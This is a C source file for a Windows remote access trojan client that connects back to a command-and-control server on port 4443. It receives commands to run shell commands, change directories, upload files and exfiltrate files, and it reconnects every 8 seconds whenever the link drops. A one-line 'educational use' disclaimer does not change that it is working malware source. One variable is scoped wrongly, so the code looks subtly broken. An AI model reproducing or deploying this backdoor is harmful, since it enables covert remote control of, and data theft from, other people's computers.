/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#include <ws2tcpip.h>
#include <stdint.h>
#include "sakito_core.h"

#define HOST "127.0.0.1"
#define PORT 4443

#pragma comment(lib, "Ws2_32.lib")

// Function to create connect socket.
const SOCKET create_socket() {
	// Initialize winsock
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	if (WSAStartup(ver, &wsData) != 0)
		return INVALID_SOCKET;

	// Create socket and hint structure
	const SOCKET connect_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	//const SOCKET connect_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (connect_socket == INVALID_SOCKET)
		WSACleanup();

	return connect_socket;
}

// Function to connect the connect socket to c2 server.
int c2_connect(const SOCKET connect_socket) {
	struct sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(PORT);
	inet_pton(AF_INET, HOST, &hint.sin_addr);

	// Connect to server hosting c2 service
	if (connect(connect_socket, (struct sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR) {
		closesocket(connect_socket);
		return SOCKET_ERROR;
	}

	return 1;
}

// Function to execute command.
BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
	BOOL i_result = sakito_win_cp(connect_socket, buf);

	if (send(connect_socket, "\x11\x13\xcf", 3, 0) < 1)
		return SOCKET_ERROR;

	return i_result;
}

// Function to receive file from client (TCP file transfer).
int send_file(const SOCKET connect_socket, char* const buf) {
	int32_t f_size = -1;

	// Open file with read permissions.
	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);

	// If File Exists.
	if (h_file != INVALID_HANDLE_VALUE) {
	   	// Get file size and serialize file size bytes.
		LARGE_INTEGER largeint_struct;
		GetFileSizeEx(h_file, &largeint_struct);
		f_size = (int32_t)largeint_struct.QuadPart;
	}

	return sakito_win_sendf(h_file, connect_socket, buf, f_size);
}

// Function to receive file from client (TCP file transfer).
int recv_file(const SOCKET connect_socket, char* const buf) {
	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);

	// Receive file size.
	if (recv(connect_socket, buf, sizeof(int32_t), 0) < 1)
		return SOCKET_ERROR;

	// Deserialize f_size.
	int32_t f_size = ntohl_conv(&*(buf));

	if (f_size > 0)
		// Windows TCP file transfer (recv) function located in sakito_tools.h.
		int i_result = sakito_win_recvf(h_file, connect_socket, buf, f_size);

	CloseHandle(h_file);

	return i_result;
}

// Main function for connecting to c2 server & parsing c2 commands.
int main(void) {
	while (1) {
		// Create the connect socket.
		const SOCKET connect_socket = create_socket();

		/* If connected to c2 recursively loop to receive/parse c2 commands. If an error-
	       occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
		   statement will parse & execute functions based on the order of probability.*/
		if (connect_socket != INVALID_SOCKET) {
			int i_result = c2_connect(connect_socket);
			while (i_result > 0) {
				// 8192 == Max command line command length in windows + 1 for null termination.
				char buf[BUFLEN + 1] = { 0 };

				if (recv(connect_socket, buf, BUFLEN, 0) < 1)
					break;

				// buf[0] is the command code and buf+1 is pointing to the parsed data.
				switch (buf[0]) {
					case '0':
						i_result = exec_cmd(connect_socket, buf+1);
						break;
					case '1':
						// Change directory.
						_chdir(buf+1);
						break;
					case '2':
						// Exit.
						return 0;
					case '3':
						// Upload file to client system.
						i_result = recv_file(connect_socket, buf);
						break;
					case '4':
						// Download file from client system.
						i_result = send_file(connect_socket, buf);
						break;
				}
			}
		}
		// If unable to connect or an error occurs sleep 8 seconds.
		Sleep(8000);
	}

	return -1;
}
